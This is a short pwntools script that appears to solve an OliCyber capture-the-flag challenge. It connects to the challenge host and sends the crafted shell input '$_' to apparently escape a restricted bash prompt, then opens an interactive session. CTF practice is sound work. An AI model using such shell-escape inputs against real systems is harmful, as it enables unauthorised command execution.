from pwn import *

HOST = "bashinatorrevenge.challs.olicyber.it"
PORT = 38053

def conn():
    return remote(HOST, PORT)

def main():
    r = conn()
    r.sendlineafter(b"$ ", b"$_")
    r.interactive()

if __name__ == "__main__":
    main()

